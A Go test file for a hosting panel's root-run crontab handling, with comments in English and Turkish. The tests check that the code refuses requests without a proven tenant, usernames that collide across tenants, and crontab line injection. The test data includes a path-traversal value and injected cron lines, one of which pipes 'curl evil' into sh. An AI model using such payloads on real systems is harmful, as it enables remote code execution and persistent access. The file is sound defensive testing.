package main

import (
	"strings"
	"testing"

	"github.com/alicelik/celikpanel/internal/hostingpath"
	"github.com/alicelik/celikpanel/internal/services"
	"github.com/alicelik/celikpanel/internal/transport"
)

// The agent runs `crontab -u <name>` as root. The target must never be an
// attacker-chosen name, and it must never be another tenant's account either.
// Every refusal below is a privilege or tenancy boundary, not input hygiene.
// Agent, `crontab -u <ad>` komutunu root olarak çalıştırır. Hedef asla
// saldırganın seçtiği bir ad olamaz, başka bir kiracının hesabı da olamaz.
// Aşağıdaki her ret bir yetki ya da kiracılık sınırıdır, girdi temizliği değil.
func TestCronTenantUserRefusesEveryRequestWithoutAProvenTenant(t *testing.T) {
	for _, tc := range []struct {
		name   string
		tenant transport.CronTenant
	}{
		{"no identity at all", transport.CronTenant{}},
		{"no subscription", transport.CronTenant{DomainID: 7, Domain: "example.com"}},
		{"no domain id", transport.CronTenant{SubscriptionID: 3, Domain: "example.com"}},
		{"negative ids", transport.CronTenant{SubscriptionID: -1, DomainID: -1, Domain: "example.com"}},
		{"empty domain", transport.CronTenant{SubscriptionID: 3, DomainID: 7}},
		{"blank domain", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "   "}},

		// These derive a name the crontab tool would misread or that is not a
		// site account shape at all.
		{"uppercase", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "WWW.Example.com"}},
		{"leading digit", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "9gag.com"}},
		{"path traversal shape", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "../../etc/passwd"}},
		{"embedded newline", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "a.com\nroot"}},
		{"embedded space", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "a b.com"}},

		// "root" is a legal POSIX name and a real account, so it survives the
		// shape check and the lookup. It is stopped by uid and by home — which
		// is the whole point of proving rather than trusting.
		// "root" geçerli bir POSIX adıdır ve gerçek bir hesaptır; bu yüzden
		// biçim denetimini ve aramayı geçer. Onu uid ve ev dizini durdurur —
		// güvenmek yerine kanıtlamanın bütün amacı budur.
		{"root", transport.CronTenant{SubscriptionID: 3, DomainID: 7, Domain: "root"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			resolved, err := cronTenantUser(tc.tenant)
			if err == nil {
				t.Fatalf("cronTenantUser(%+v) = %q, want an error", tc.tenant, resolved)
			}
			if resolved != "" {
				t.Fatalf("a refused request must resolve to nothing, got %q", resolved)
			}
		})
	}
}

// Why cronTenantUser needs two proofs and not one.
//
// SiteUsername is not injective: it folds both "." and "-" to "_" and truncates
// at 32 characters, so distinct domains — owned by distinct customers — can
// derive the SAME system account name. A username alone therefore cannot say
// which tenant a request belongs to, and trusting one would let a caller reach
// another customer's crontab. The home directory is the injective half: it is
// built from the subscription and domain IDs, which are unique by construction.
//
// SiteUsername tek yönlü değildir: hem "." hem "-" karakterini "_" yapar ve 32
// karakterde keser; bu yüzden farklı müşterilere ait farklı alan adları AYNI
// sistem hesabı adını türetebilir. Dolayısıyla tek başına bir kullanıcı adı bir
// isteğin hangi kiracıya ait olduğunu söyleyemez ve ona güvenmek, bir çağıranın
// başka bir müşterinin crontab'ına ulaşmasına izin verirdi. Ev dizini, tek yönlü
// olan yarıdır: yapısı gereği benzersiz olan abonelik ve alan adı numaralarından
// kurulur.
func TestDerivedUsernamesCollideAcrossTenantsSoTheHomeCheckIsLoadBearing(t *testing.T) {
	for _, pair := range [][2]string{
		{"my-shop.com", "my.shop.com"},
		{"a-b-c.example.com", "a.b.c.example.com"},
		// Truncation collides too: the first 32 characters are identical.
		{
			"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-one.com",
			"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-two.com",
		},
	} {
		left, right := services.SiteUsername(pair[0]), services.SiteUsername(pair[1])
		if left != right {
			t.Fatalf("expected %q and %q to collide on a username, got %q and %q",
				pair[0], pair[1], left, right)
		}
	}

	// The proof that separates them. Same derived username, different homes.
	// Onları ayıran kanıt. Aynı türetilmiş kullanıcı adı, farklı ev dizinleri.
	first, err := hostingpath.SiteHome(11, 22)
	if err != nil {
		t.Fatal(err)
	}
	second, err := hostingpath.SiteHome(33, 44)
	if err != nil {
		t.Fatal(err)
	}
	if first == second {
		t.Fatal("site homes must be unique per tenant, or the second proof proves nothing")
	}
	if !hostingpath.IsSiteHome(first) || !hostingpath.IsSiteHome(second) {
		t.Fatalf("SiteHome must produce paths IsSiteHome accepts: %q, %q", first, second)
	}
}

// Schedule, command and comment are formatted into a crontab with Sprintf, so
// anything carrying a line break writes crontab lines nobody asked for — a
// second schedule, running as that user, invisible in the panel's own listing.
func TestRejectCrontabInjectionRefusesLineBreaks(t *testing.T) {
	injections := map[string]string{
		"newline":         "/usr/bin/backup\n* * * * * /bin/sh -c 'curl evil|sh'",
		"carriage return": "/usr/bin/backup\r* * * * * /bin/sh",
		"nul":             "/usr/bin/backup\x00* * * * *",
	}
	for name, payload := range injections {
		t.Run(name, func(t *testing.T) {
			for _, field := range []string{"schedule", "command", "comment"} {
				err := rejectCrontabInjection(map[string]string{field: payload})
				if err == nil {
					t.Fatalf("field %q accepted %q", field, payload)
				}
				if !strings.Contains(err.Error(), field) {
					t.Fatalf("refusal must name the offending field, got %v", err)
				}
			}
		})
	}
}

// The guard must not reject ordinary jobs: a command with flags, quotes, pipes
// and a redirect is normal cron content and stays on one line.
func TestRejectCrontabInjectionAllowsOrdinaryCommands(t *testing.T) {
	err := rejectCrontabInjection(map[string]string{
		"schedule": "*/15 * * * *",
		"command":  `/usr/bin/php -q /var/www/app/cron.php --quiet >> /tmp/cron.log 2>&1`,
		"comment":  "nightly backup (kept 7 days)",
	})
	if err != nil {
		t.Fatalf("ordinary cron content was refused: %v", err)
	}
}
